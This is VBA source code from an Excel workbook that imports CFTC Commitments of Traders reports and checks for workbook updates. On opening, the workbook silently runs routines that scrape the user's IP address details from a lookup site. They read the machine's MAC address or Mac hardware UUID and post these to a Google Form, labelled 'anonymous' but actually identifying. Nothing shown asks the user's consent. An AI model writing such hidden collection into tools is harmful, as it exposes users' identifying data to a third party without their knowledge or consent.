                        Case 1 + X 'Column with Market Names

                            TempA(I) = Trim(TempB(LBound(TempB)))

                        Case UBound(TempA) 'Contract Codes

                            TempA(I) = TempB(LBound(TempB) + 3)

                                .Item(CStr(Key)) = TempA

                        Case 2 + X To UBound(TempA) - 1

                            TempA(I) = CLng(TempB(I + Offset_1))

                    End Select

                Next I

        End Select

    Next Key

End With

End Sub
Public Function Test_For_Data_Addition(Optional WKB As String) As Boolean
'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
' IF DATA HAS BEEN RELEASED SINCE THE FILE WAS LAST MODIFIED
'/////////////////////////////////////////////////////
Dim X As Long, Y As Long, Schedule_AR As Variant, Current_Date As Date, _
 Last_Release As Date, UTC_TimeZone_Difference, INTE_D As Date

Schedule_AR = Variable_Sheet.ListObjects("Release_Schedule").Range.Value2 'table that contains release dates for the year

Current_Date = UTC

UTC_TimeZone_Difference = DateDiff("h", Now, Current_Date, vbSunday, vbFirstJan1) Mod 24

X = 1 'Initialize loop to search January First
Y = 2 'start at 2 so that days are iterated and not the month String

'The folowing loop will find the date last updated by the CFTC

Do While Last_Release <= Current_Date And DateDiff("d", Last_Release, Current_Date) >= 7
'Loop while Last_Release variable is less than Current date and the difference between them is greater than 7
    
    If Y > UBound(Schedule_AR, 2) Then  'check column number to make sure that errors are avoided
        Y = 2                           'reset back to second position
        X = X + 1                       'next row
        If X > 12 Then
            'Signifies that the loop has parsed the last month of the year and conditions were not met to naturally exit the loop
            'User likely doesn't have Power Query to Auto-Update the table
            'Continue to check difference between file dates
            Exit Do
        End If
    End If
    
    If Schedule_AR(X + 1, Y) <> vbNullString Then
    
        INTE_D = DateSerial(Schedule_AR(1, 1), X, Replace(Schedule_AR(X + 1, Y), "*", vbNullString)) _
                + TimeSerial(19, 30, 0)
    
        If INTE_D > Current_Date Then
            Exit Do
        Else
            Last_Release = INTE_D  'Release time in UTC
        End If
        
    End If
    
    Y = Y + 1
Loop

If WKB <> vbNullString Then
    If LastModified(WKB) + TimeSerial(UTC_TimeZone_Difference, 0, 0) < Last_Release Then
        Test_For_Data_Addition = True 'If data has been updated since
    End If                            'the Compilation workbook was made...THEN return True
Else
   Debug.Print Last_Release
End If

End Function
Private Function Web_Query_MAC() As Variant

Dim QT As QueryTable, Temp_D As New Dictionary, Data() As Variant, URL As String, _
Valid_Codes() As Variant, Column_F() As Variant, Y As Long, Parsed() As Variant, ZZ As Long, EE As Variant, BB As Boolean

With Application

    BB = .EnableEvents
    
    
    .EnableEvents = False
    .DisplayAlerts = False
    
    On Error GoTo Swap_Valid_Sheet_Reference
    Valid_Codes = .Index(HUB_Name, 0, 1)
    On Error GoTo 0
    
End With

Select Case TypeF

    Case "L"

        URL = "https://www.cftc.gov/dea/newcot/deacom.txt"
        ReDim Column_F(1 To 129)

        For ZZ = 1 To UBound(Column_F) 'determine which columns to be imported

            Select Case ZZ
                Case 2, 5 To 7, 18 To 37, 58 To 129 'skip these columns
                  Column_F(ZZ) = xlSkipColumn
                Case 4
                    Column_F(ZZ) = xlTextFormat 'import contract codes as text
                Case Else
                    Column_F(ZZ) = xlGeneralFormat
            End Select

        Next ZZ

    Case "D"

        URL = "https://www.cftc.gov/dea/newcot/c_disagg.txt"
        ReDim Column_F(1 To 191)

        For ZZ = 1 To UBound(Column_F) 'determine which columns to be imported

            Select Case ZZ
                Case 2, 5 To 7, 24 To 55, 72 To 185, 187 To 191 'skip these columns
                  Column_F(ZZ) = xlSkipColumn
                Case 4
                    Column_F(ZZ) = xlTextFormat 'import contract codes as text
                Case Else
                    Column_F(ZZ) = xlGeneralFormat
            End Select

        Next ZZ

    Case "T"
    
        URL = "https://www.cftc.gov/dea/newcot/FinComWk.txt"
        ReDim Column_F(1 To 87)

        For ZZ = 1 To UBound(Column_F) 'determine which columns to be imported
        
            Select Case ZZ
                Case 2, 5 To 7, 60 To 87 'skip these columns
                    Column_F(ZZ) = xlSkipColumn
                Case 4
                    Column_F(ZZ) = xlTextFormat 'import contract codes as text
                Case Else
                    Column_F(ZZ) = xlGeneralFormat
            End Select
            
        Next ZZ
    
End Select
    
On Error GoTo PowerQ_Missing_Mac

Set QT = QueryT.QueryTables.Add(Connection:="TEXT;" & URL, Destination:=QueryT.Range("A1"))

With QT

    .RefreshStyle = xlOverwriteCells
    .BackgroundQuery = False
    .SaveData = False
    .AdjustColumnWidth = False
    .TextFileCommaDelimiter = True
    .PreserveFormatting = True
    .TextFileColumnDataTypes = Column_F
    .WorkbookConnection.Name = "Weekly Data"
    .Refresh False

    With .ResultRange
        Data = .Value2 'Store Data in an Array
        .ClearContents 'Clear the Range
    End With

    .Delete            'To avoid errors in future use

End With

Set QT = Nothing

On Error GoTo 0

ReDim Parsed(1 To UBound(Data, 1), 1 To UBound(Data, 2))

For ZZ = 1 To UBound(Data, 1)

    For Y = 1 To UBound(Data, 2)
    
        Select Case Y
            Case 1
                Parsed(ZZ, Y) = Data(ZZ, 2) 'Dates placed in 1st column
            Case 2
                Parsed(ZZ, Y) = Data(ZZ, 1) 'Market Name -2nd Column
            Case UBound(Parsed, 2)
                Parsed(ZZ, Y) = Data(ZZ, 3) 'Contract Code-Last Column
            Case Else
                Parsed(ZZ, Y) = Data(ZZ, Y + 1) 'shift everything else left 1
        End Select
        
    Next Y
    
Next ZZ

Erase Data

With Application

    For ZZ = 1 To UBound(Parsed, 1)
        If Not IsError(.Match(Parsed(ZZ, UBound(Parsed, 2)), Valid_Codes, 0)) Then Temp_D.Add Parsed(ZZ, UBound(Parsed, 2)), .Index(Parsed, ZZ, 0)
    Next ZZ
'    For ZZ = 1 To UBound(Valid_Codes, 1)
'        If IsError(.Match(Valid_Codes(ZZ, 1), Temp_D.Keys, 0)) Then Debug.Print Valid_Codes(ZZ, 1)
'    Next ZZ

    ReDim Parsed(1 To Temp_D.count, 1 To UBound(Parsed, 2))
    ZZ = 1
    
    For Each EE In Temp_D.Items 'combine elements into a single array
        For Y = 1 To UBound(Parsed, 2)
            Parsed(ZZ, Y) = EE(Y)
        Next Y
        ZZ = ZZ + 1
    Next EE
    
    Web_Query_MAC = Parsed
    
    .DisplayAlerts = True
    .EnableEvents = BB
        
End With

Exit Function

Swap_Valid_Sheet_Reference:

    Valid_Codes = Variable_Sheet.ListObjects("Table_WSN").DataBodyRange.Columns(1).Value2
    Err.Clear
    Resume Next
    
PowerQ_Missing_Mac:

    MsgBox "Power Query is required to run this macro while on the MAC Operating System. " & vbNewLine & _
    "If Power Query is installed [Comes with excel by default depending on your Excel version] then contact me using the [Feedback] Macros on the [ HUB ]" & vbNewLine & _
    " worksheet or email me at MoshiM_UC@outlook.com"
    
    Call Re_Enable
    
    End

End Function

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Public Last_Used_Sheet As Worksheet
Public Password_M As String
Public Procedure_Active As Boolean
Public Unique_ID As String
Public SerialN As Long
Public Run_When As Double
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
Option Explicit
Private Sub Workbook_Activate()

Application.Run "'" & ThisWorkbook.Name & "'!" & "Run_These_Key_Binds"

End Sub
Private Sub Workbook_Deactivate()

If ThisWorkbook.Last_Used_Sheet Is Nothing Then Application.Run "'" & ThisWorkbook.Name & "'!" & "Remove_Key_Binds"

End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean)

With ThisWorkbook

   On Error Resume Next
   
   Application.OnTime earliesttime:=.Run_When, Procedure:="'" & .Name & "'!Update_Check", Schedule:=False
    
End With
    
End Sub
Private Sub Workbook_Open()

Application.ScreenUpdating = False

With HUB

    .Shapes("Macro_Check").Visible = False 'turns off display box if macros are on
    .Shapes("DN_List").Visible = False
    
    If Not ThisWorkbook.ActiveSheet Is HUB Then
        .Activate
    Else
        Application.Run "'" & ThisWorkbook.Name & "'!HUB.Range_Zoom"
    End If

End With

With Application
          
    #If Mac Then 'Stuff to be run only on MAC
    
        .Run "'" & ThisWorkbook.Name & "'!User_Info_Mac"    'Upload Anonymous user info to Google Form
                
        .StatusBar = "Navigation Userform: CTRL+SHIFT+C. Due to your operating system constraints," & _
                    " various macros have been disabled. If you would like access to these macros please provide feedback" & _
                    " using the macros found on the HUB."
        
        Navigation.Show 'this will call "Update_List" with special parameters to avoid ActiveX objects
        
        GoTo Non_UUID
        
    #Else 'Things to be run if on Windows
    
        .Run "'" & ThisWorkbook.Name & "'!Update_List" 'Populate ComboBoxes
        
         HUB.Sheet_Selection.Text = "Sheet Selection"  'Change text of this ComboBox
         
         Weekly.F.Value = True 'set Test_Mode = to False
         
         If UUID Then 'If on my Windows PC
        
            Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange. _
                    Find("Unlock_Project_Toggle", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1).Value2 = 0
                
            .Run "'" & ThisWorkbook.Name & "'!My_NSFW"

        Else
    
            .StatusBar = "Navigation Userform: CTRL+SHIFT+C"

            .Run "'" & ThisWorkbook.Name & "'!User_Info"    'Upload Anonymous user info to Google Form
            
            GoTo Non_UUID
            
        End If
    
    #End If

    .ScreenUpdating = True
        
End With

Workbook_Ready:

ThisWorkbook.Saved = True

Exit Sub

Non_UUID:

    Donators QueryT, HUB.Shapes("DN_List")  'Update Donator amount and Number
    Application.Run "'" & ThisWorkbook.Name & "'!Update_Check" 'Check if a new workbook version is available
    GoTo Workbook_Ready
    
End Sub
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)

With Application
    .ScreenUpdating = False: .EnableEvents = False
End With
     
HUB.Shapes("Macro_Check").Visible = True
   
If UUID Then 'if on creator computer then
 
     With ThisWorkbook

          .Procedure_Active = True
     
          If Not ActiveWorkbook Is ThisWorkbook Then .Activate
         
          If .Last_Used_Sheet Is Nothing Then
         
              Set .Last_Used_Sheet = .ActiveSheet
              
              Application.Run "'" & .Name & "'!Remove_Images"
              
          End If
         
          If Not .ActiveSheet Is HUB Then HUB.Activate
         
          Application.Run "'" & .Name & "'!Update_Date"
    
     End With
     
 End If
   
Application.EnableEvents = True
 
End Sub
Private Sub Workbook_AfterSave(ByVal Success As Boolean)
     
    HUB.Shapes("Macro_Check").Visible = False 'Turns this textbox back off if macros are enabled
    
With Application

    If UUID Then 'If on Creator computer then
        
        .EnableEvents = False
            
        .Run "'" & ThisWorkbook.Name & "'!My_NSFW"
        
        If Not ThisWorkbook.Last_Used_Sheet Is HUB Then ThisWorkbook.Last_Used_Sheet.Activate
           
        .EnableEvents = True

    End If
    
    .ScreenUpdating = True
    
End With

With ThisWorkbook

    Set .Last_Used_Sheet = Nothing
    .Procedure_Active = False
    .Saved = True
    
End With
    
End Sub
Private Sub Workbook_NewSheet(ByVal SH As Object)
With Application

.ScreenUpdating = False
    
    Dim WS As Worksheet: Set WS = ThisWorkbook.ActiveSheet
    
    If MsgBox("Will this Worksheet be used to hold Contract Data ?" & vbNewLine & "If so, will it be in the same format as the original document?", vbYesNo, "Please choose") _
            = vbYes Then
            
        With WS
        
            .Range("AV:AW,AY:BB,AR:AR").NumberFormat = "0%"
            .Columns("AG:AG").NumberFormat = "@"
            .Columns("A:A").NumberFormat = "yyyy-mm-dd;@"
        
        End With
        
    End If
    
.ScreenUpdating = True

End With

End Sub
'Private Sub Apply_ID() 'quandl ID
'
'Dim Path As String, filenumber As Long, MData As String, D_Str() As String
'
'        filenumber = FreeFile: Path = Environ("ONEDRIVE") & "\C.O.T Password.txt"
'
'        Open Path For Input As #filenumber
'
'            MData = Input(LOF(filenumber), #filenumber)
'
'            D_Str = Split(MData, Chr(44))
'
'            HUB.Range("D20").Value2 = D_Str(1) 'Barchart_ID
'
'        Close #filenumber
'
'End Sub

Attribute VB_Name = "Update_File"
Attribute VB_Base = "0{1E659470-757E-48A9-8F4C-731490242928}{088E32ED-913D-4756-B775-A3136CBCC2E3}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False


Public URL As String

Private Sub UserForm_Initialize()

Dim File_Type As String, Target_URL As String, X As Long, File_Date As Date

With Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange

    File_Type = .Find("Type", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1).Value2

    File_Date = CDate(.Find("Update", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1).Value2 - 1)

End With
    
X = Application.Match(File_Type, Array("L", "D", "T"), 0) - 1

If X = 0 Then
    Me.URL = "http://bit.ly/MoshiM_Legacy"
ElseIf X = 1 Then
    Me.URL = "http://bit.ly/MoshiM_Disaggregated"
ElseIf X = 2 Then
    Me.URL = "http://bit.ly/MoshiM_TFF"
End If

On Error GoTo Patch_Note_Error

    Target_URL = Replace("https://www.dropbox.com/s/o4ed47efn1lx3i2/Patch_Notes.txt?dl=0", _
        "www.dropbox.com", "dl.dropboxusercontent.com") 'url for patch notes
    
    With Me.Patch_Notes
    
        #If Mac Then
            .Text = Mac_Patch(X, Target_URL)
        #Else
            .Text = Windows_Patch(X, Target_URL)
        #End If
        
        .SelStart = 0 'place cursor at top
        
    End With
    
    Me.Sincerely.Caption = "Click to Donate" 'change caption for donation label
    
    With Relevance 'Label that shows the user the version of the file they have
        .Caption = "Your Version : " & Format(Day(File_Date), "00") & _
            "-" & MonthName(Month(File_Date), True) & "-" & Year(File_Date)
        '.BackColor = RGB(249, 203, 111)
    End With
    
    With Question 'Label that asks if the user wants to download the file
        .BackColor = RGB(133, 59, 114)
        .ForeColor = RGB(255, 255, 255)
        .TextAlign = fmTextAlignCenter
        .Caption = "Would you like to Download the latest version of this workbook?"
        .AutoSize = False
    End With
    
Exit Sub

Patch_Note_Error:
    MsgBox "Something went wrong in connecting to the Patch Notes DropBox file." & _
    "Please notify me via the Email macro on the HUB or contact me at MoshiM_UC@outlook.com"
    
End Sub
Private Function Windows_Patch(Subset_Number As Long, HTTP_URL As String) As String

Dim WinHttpReq As New MSXML2.XMLHTTP60, HTML As New HTMLDocument, ST() As String, Y As Long, _
String_A_Subset() As String, Y2 As Long

    With WinHttpReq
        .Open "GET", HTTP_URL, False 'File is a HTTP_URL/web page: False means that it has to make the connection before moving on
        .send         'File is the HTTP_URL of the file or webpage
        HTML.Body.innerHTML = .responseText
    End With
        
    ST = Split(Split(HTML.Body.FirstChild.Data, "<>")(Subset_Number), "*") 'delimit string with <> and then * to create an array by date
    
    For Y = 1 To UBound(ST) 'Skip empty string in 1st line
    
        String_A_Subset = Split(ST(Y), Chr(149)) 'split with a bullet
        
        String_A_Subset(0) = String_A_Subset(0) & vbNewLine 'this is the date
        
        For Y2 = 1 To UBound(String_A_Subset) 'skip dates and recreate each line
        
            String_A_Subset(Y2) = Chr(9) & Chr(149) & String_A_Subset(Y2) 'TAB;    BULLET;    STRING
         
        Next Y2
        
        Windows_Patch = Windows_Patch & Join(String_A_Subset, vbNewLine) & vbNewLine & vbNewLine 'join array with a new line and append to variable Body
        
    Next Y
    
End Function
Private Function Mac_Patch(Subset_Number As Long, HTTP_URL As String) As String

Dim QT As QueryTable, Subset_A() As Variant, Subset_Location_Start(2) As Long, X As Long, Z As Long

On Error GoTo 0

Set QT = QueryT.QueryTables.Add(Connection:="TEXT;" & HTTP_URL, Destination:=QueryT.Range("a1"))

With QT

    .RefreshStyle = xlOverwriteCells
    .AdjustColumnWidth = False
    .SaveData = False
    .WorkbookConnection.Name = "Patch Notes"
    .Refresh False
    
    With .ResultRange
        Subset_A = .Value2
        .ClearContents
    End With
    
    .Delete
        
End With

Set QT = Nothing

Subset_Location_Start(0) = 1 'Legacy starts at row 1

For X = 1 To UBound(Subset_A) 'find Doc Type Subset starts

    If InStr(1, Subset_A(X, 1), "<>") > 0 Then
    
        Z = Z + 1
        Subset_Location_Start(Z) = X
            
    End If
    
Next X

'Find  the <> delimiters in column 1

If Subset_Number = 2 Then 'determine string subset range

    Z = UBound(Subset_A, 1)
    
Else

    Z = Subset_Location_Start(Subset_Number + 1) - 2
    
End If

For X = Subset_Location_Start(Subset_Number) To Z 'Construct String

    If X = Subset_Location_Start(Subset_Number) Then _
        Subset_A(X, 1) = Replace(Subset_A(X, 1), "<>", vbNullString)

    If InStr(1, Subset_A(X, 1), "*") > 0 Then 'if date column and row contains *
    
        Mac_Patch = Mac_Patch & Replace(Subset_A(X, 1), "*", vbNullString) & vbNewLine
        
    ElseIf IsEmpty(Subset_A(X, 1)) And IsEmpty(Subset_A(X, 2)) Then
        
        Mac_Patch = Mac_Patch & vbNewLine
        
    ElseIf Not IsEmpty(Subset_A(X, 2)) Then
        
        Mac_Patch = Mac_Patch & Chr(9) & Subset_A(X, 2) & vbNewLine
    
    End If
    
Next X

End Function
Private Sub CMD_No_Click()

Dim TT As String

On Error Resume Next

If Not UUID Then
 
    With ThisWorkbook
    
        If MsgBox("Would you like to set a reminder?", vbYesNo) = vbYes Then
        
            Application.OnTime .Run_When, "'" & .Name & "'!Update_Check", , False 'cancel what is already scheduled
    
            TT = Application.InputBox("Please input reminder Time in the form Hours:Minutes:Seconds")
            
            .Run_When = Now + TimeValue(TT)
            
            Application.OnTime .Run_When, "'" & .Name & "'!Update_Check" 'new schedule time
            
        Else
        
            If MsgBox("Do you want to stop future checks until this workbook is closed", vbYesNo) = vbYes Then
           
                Application.OnTime .Run_When, "'" & .Name & "'!Update_Check", , False 'cancel what is already scheduled
            
            End If
            
        End If
        
    End With

End If

    Unload Me
    
End Sub
Private Sub CMD_Yes_Click()

With ThisWorkbook

    On Error Resume Next
    
    Application.OnTime .Run_When, "'" & .Name & "'!Update_Check", , False 'cancel currently running timer
    
    On Error GoTo Yes_Error
    
    .FollowHyperlink Me.URL
    
    Unload Me
    
End With

Exit Sub

Yes_Error:
    MsgBox "Something went wrong in navigating to the URL of the updated version of this file." & vbNewLine & _
    "Alternatively try [  http://bit.ly/CFTCMM  ]." & vbNewLine & vbNewLine & _
    "Please notify me via the Email macro on the HUB or contact me at MoshiM_UC@outlook.com"

End Sub
Private Sub Sincerely_Click()
    Donation.Show
End Sub
Attribute VB_Name = "User_Notes"
Attribute VB_Base = "0{ECF2B1F9-280B-4665-B8BE-06AC38BAB103}{91AD0257-6EBF-42F2-96F1-BC7EF7A8840F}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub Link_Click()
ThisWorkbook.FollowHyperlink "https://www.dropbox.com/s/0vwbyetb5n16gj5/ReadMe%20File.docx?dl=0"
End Sub

Private Sub UserForm_Initialize()

With Me
    .Text.Caption = "Check the CFTC's website to find out what a consolidated contract is." & _
    " Keep in mind that both the normal and E-mini versions of consolidated contracts provide more historical data." & _
    " However, it's possible to combine the two to fill in the missing data!!" & vbNewLine & vbNewLine & _
    "CTRL+B :   Navigate to the HUB worksheet." & vbNewLine & _
    "CTRL+SHIFT+B : Navigate to Charts" & vbNewLine & _
    "CTRL+SHIFT+X : Remove all formatting from the current worksheet." & vbNewLine & _
    "CTRL+S : Suppress messages from the document inspector while saving" & vbNewLine & _
    "CTRL+SHIFT+C : Open a navigation userform." & vbNewLine & vbNewLine & _
    "For a list of available macros, locate the Developer tab in the ribbon." ' & vbNewLine & vbNewLine & _

    .Link.Width = .Width
End With

End Sub
Attribute VB_Name = "User_Statistics"
Private Sub User_Info()

Dim WinHttpReq As New MSXML2.XMLHTTP60, URL As String, HTML As New MSHTML.HTMLDocument, _
Anonymous_Info() As String, Z As Long, Request As New MSXML2.ServerXMLHTTP60, ANON As MSHTML.IHTMLElementCollection

'Dim TT As Double
'TT = Timer

URL = "https://whatismyipaddress.com/"

On Error GoTo Failed_IP_Parse

With WinHttpReq

    .Open "GET", URL, False 'File is a URL/web page: False means that it has to make the connection before moving on
    .send         'File is the URL of the file or webpage

    HTML.Body.innerHTML = .responseText
    
End With

Set ANON = HTML.getElementsByTagName("tr")

With ANON

    ReDim Anonymous_Info(2 To .Length + 1)

    For Z = 2 To .Length + 1
        
        If Z <= .Length Then
            Anonymous_Info(Z) = Split(.Item(Z - 1).innerText, ":")(1)
        Else
            Anonymous_Info(Z) = User_MAC_Address
        End If
        
    Next
    
End With

URL = "https://docs.google.com/forms/d/e/1FAIpQLSfDB8cfBFZFcPf15tnaxuq6OStkmRYm4VlZjYWE8PEvm6qhFA/formResponse?ifq" & _
"&entry.227122838=" & Anonymous_Info(2) & _
"&entry.1815706984=" & Anonymous_Info(3) & _
"&entry.55364550=" & Anonymous_Info(4) & _
"&entry.1590825643=" & Anonymous_Info(5) & _
"&submit=Submit"

'Debug.Print "Time to Parse user Statistics: " & Timer - TT
'
'TT = Timer

With Request

    .Open "POST", URL, False 'File is a URL/web page: False means that it has to make the connection before moving on
    
    .send
    
End With

Failed_IP_Parse:

Set ANON = Nothing
Erase Anonymous_Info
Set WinHttpReq = Nothing
Set HTML = Nothing
Set Request = Nothing

'Debug.Print "Time to Upload user Statistics: " & Timer - TT

End Sub
Private Function User_MAC_Address() As String
 
    'Declaring the necessary variables.
    Dim strComputer     As String
    Dim objWMIService   As Object
    Dim colItems        As Object
    Dim objItem         As Object

On Error GoTo Clear_Memory_MAC

    'Set the computer.
    strComputer = "."
 
    'The root\cimv2 namespace is used to access the Win32_NetworkAdapterConfiguration class.
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
 
    'A select query is used to get a collection of network adapters that have the property IPEnabled equal to true.
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
 
    'Loop through all the collection of adapters and return the MAC address of the first adapter that has a non-empty IP.
    For Each objItem In colItems
    
        If Not IsNull(objItem.IPAddress) Then
        
            User_MAC_Address = objItem.MACAddress 'Return the IP string.

            GoTo Clear_Memory_MAC
        
        End If
        
    Next

Clear_Memory_MAC:

    Set objWMIService = Nothing
    Set colItems = Nothing
    Set objItem = Nothing
    
End Function
Private Sub User_Info_Mac()

Dim QT As QueryTable, Anonymous_Info(), GString As String

'Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
'
'Function getHTTPPost(sUrl As String, sQuery As String) As Long
'
'    sCmd = "curl -v -X POST -d '" & sQuery & "' " & sUrl
'    exitCode = system(sCmd)
'
'End Sub

'ans = getHTTPPost("http://example.com", "q=hello&t=now")

Set QT = QueryT.QueryTables.Add(Connection:="URL;https://whatismyipaddress.com/", Destination:=QueryT.Range("A1"))
 
With QT

    .RefreshStyle = xlOverwriteCells
    .SaveData = False
    .WebSelectionType = xlAllTables
    .AdjustColumnWidth = False
    .WorkbookConnection.Name = "Misc"
    .Refresh False
    
    With .ResultRange
        Anonymous_Info = WorksheetFunction.Transpose(.Columns(2).Value2)
        .ClearContents
    End With
    
    .Delete
    
End With

URL = "https://docs.google.com/forms/d/e/1FAIpQLSfDB8cfBFZFcPf15tnaxuq6OStkmRYm4VlZjYWE8PEvm6qhFA/formResponse?ifq"

GString = "&entry.227122838=" & Anonymous_Info(2) & _
"&entry.1815706984=" & Anonymous_Info(3) & _
"&entry.55364550=" & Anonymous_Info(4) & _
"&entry.1590825643=" & MachineUniqueIndentifierMac_1 & _
"&submit=Submit"

Set QT = QueryT.QueryTables.Add(Connection:="URL;" & URL, Destination:=QueryT.Range("A1"))

With QT 'Post to google Forms
    
    .PostText = GString
    .RefreshStyle = xlOverwriteCells
    .SaveData = False
    .Refresh False
    .ResultRange.ClearContents
    .Delete

End With

Set QT = Nothing
'https://docs.google.com/forms/d/e/1FAIpQLSfDB8cfBFZFcPf15tnaxuq6OStkmRYm4VlZjYWE8PEvm6qhFA/viewform?usp=sf_link

End Sub
Private Function MachineUniqueIndentifierMac_1() As String
'Get the machine unique indentifier of a Mac
    Dim ScriptToRun As String

    ScriptToRun = _
    "set uuid to do shell script ""system_profiler SPHardwareDataType" & _
                " | awk '/Hardware UUID:/ {print $NF}'"""

    On Error Resume Next
    
    #If Mac Then
    
        MachineUniqueIndentifierMac_1 = MacScript(ScriptToRun)
        
        If Err.Number <> 0 Then Err.Clear
        
    #End If
    
    On Error GoTo 0

    'Or add it to a cell in your worksheet so you can test
    'if your workbook is running on the correct machine
    'Sheets(1).Range("A1").Value = Answer

End Function

Attribute VB_Name = "Variable_Sheet"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Worksheet_Activate()

Dim ZoomThisRange As Range

With Me 'Zoom in on Macro Pictures

    If UUID Then
        
        With .Shapes("Macros")
        
            Set ZoomThisRange = Me.Range(.TopLeftCell, .BottomRightCell) ' Me.Range("A23:L43") '
            
            If .Visible = False Then .Visible = True
            
        End With
        
        Call ZoomToRange(ZoomThisRange, True)
        
    Else
        .Visible = xlSheetVeryHidden
        .Shapes("Macros").Visible = False
    End If

End With

End Sub
Private Sub Worksheet_Change(ByVal Target As Range)

Dim UForm As UserForm

For Each UForm In VBA.UserForms

    If UForm Is Input_Directory Then Input_Directory.Text_Input.SetFocus

Next

End Sub
Private Sub Worksheet_Deactivate()

Dim UForm As UserForm

For Each UForm In VBA.UserForms

    If UForm Is Input_Directory Then 'unload the innput_directory userform if it is currently loaded
        Unload Input_Directory
        Exit Sub
    End If
    
Next UForm

End Sub
Private Sub Insert_Directory()
    Input_Directory.Show
End Sub
Private Sub Patch_Update()
   Patch_Note_Update.Show
End Sub
Private Sub Organize_Pictures()

Dim Y As Long, SHP As Shape, Z As Long, Shape_Names As String, WB As Workbook, WB_Path As String

Const Grid As Long = 5 'number of pictures that will make up each row of the grid

With Me

    If .Shapes.count <= 3 Then Exit Sub 'group at least 2 items and skip Macros
    
    WB_Path = Environ("ONEDRIVE") & "\Collage.xlsb"
    
    On Error GoTo 0

    .Shapes("Macros").ZOrder msoSendToBack 'move to bottom of selection pane ie: me.shape(1)
    
    Set SHP = .Shapes(2) 'First shape of grid
    
    Shape_Names = SHP.Name 'this variable [Shape_Names] will be used to group shapes at the end
    
    With Application
        .EnableEvents = False
        .ScreenUpdating = False
    End With
    
    For Z = 3 To .Shapes.count 'shape [1] is "Macros" while [2] is SHP so skip to 3
        
        If Not .Shapes(Z) Is SHP And Not .Shapes(Z) Is .Shapes("Macros") Then
    
            Y = Y + 1
            
            With .Shapes(Z)
                .LockAspectRatio = msoTrue
                .Height = SHP.Height 'change height of the picture
                Shape_Names = Shape_Names & "," & .Name 'add the name of the shape to the string variable
            End With
            
            If Y Mod Grid <> 0 Then 'IF Y is not a multiple of 5 then place pictures to the right within the current row of the grid
               
                With .Shapes(Z - 1)
                    Me.Shapes(Z).Top = .Top             'set top = to previous shapes top
                    Me.Shapes(Z).Left = .Left + .Width  'set left position equal to previous left + previous width
                End With
               
            Else 'if a multple of 5 then place in the same grid column as the first Shape
            
                With SHP
                    Me.Shapes(Z).Top = .Top + .Height * (Y / Grid) 'top equals original height times the grid row number
                    Me.Shapes(Z).Left = .Left 'place shape in line with original
                End With
                
            End If
            
        End If
    
    Next
    
    On Error GoTo Possible_Duplicate_Error
    
    'GoTo Ending

    With .Shapes.Range(Split(Shape_Names, ",")).Group 'group the moved pictures uing an array created from the string of shape name
        .Name = Now 'Name the group with a timestamp
        .Cut 'cut the group
    End With
    
End With

On Error GoTo 0

If Dir(WB_Path) <> vbNullString Then 'if the workbook exists

    With Workbooks.Open(Filename:=WB_Path, UpdateLinks:=False) 'open workboo
        
        .Windows(1).Visible = False 'load workbook in background
        
        With .Worksheets(1)
        
            .Paste 'paste the cut group to 2nd worksheet of collage workbook
            
            Set SHP = .Shapes(.Shapes.count)
            
            With SHP 'newly added shape
            
                .Visible = False 'shape group will not be visible but individual pictures will be [Allows for an Easy Todggle]
                
                With .Parent.Range("A2") 'move to upper left corner of worksheet'
                    SHP.Top = .Top
                    SHP.Left = .Left
                End With
                
            End With
                
        End With
         
        .Close True 'close and save the workbook
        
    End With

Else
    MsgBox Environ("ONEDRIVE") & "\Collage.xlsb couldn't be found"
    Variable_Sheet.Paste 'paste back to worksheet so that images aren't lost
    
End If

Ending:

With Application
    .EnableEvents = True
    .ScreenUpdating = True
End With

Set WB = Nothing
Set SHP = Nothing

Exit Sub

Possible_Duplicate_Error:
    MsgBox "There may be a duplicate in one of the picture names"
    GoTo Ending

End Sub
Private Sub Re_Size()

Dim SHP As Shape, IDirect As Shape, Patch As Shape, Collage As Shape, Misc As Shape

Set IDirect = Shapes("Hamburger-[nZWFRONQqI33WzO2oJgXMrQ5Gro9IXc177Y93fjA9gA.png]")

Set Patch = Shapes("Palutena-{ivmb3zq451y31.png}")

Set Collage = Shapes("Skirt-[EI63eCPVUAAPIgo.jpg]")

Set Misc = Shapes("Tie-{74241216_p0.jpg}")

With IDirect

    .LockAspectRatio = msoTrue

    .Height = Range("A23:A44").Height
    
    .Left = Range("A1").Left
    
End With

For Each SHP In Shapes("Macros").GroupItems

    With SHP
    
        .Top = Range("A23").Top
        
        If Not SHP Is IDirect Then
        
            .LockAspectRatio = msoTrue
            
             .Height = IDirect.Height
            
            If SHP Is Patch Then
            
                .Left = Misc.Left - Patch.Width

            ElseIf SHP Is Collage Then
                
                .Left = Misc.Left + Misc.Width
                
            ElseIf SHP Is Misc Then
                
                .Left = Collage.Left - Misc.Width
                
            End If
            
        End If
        
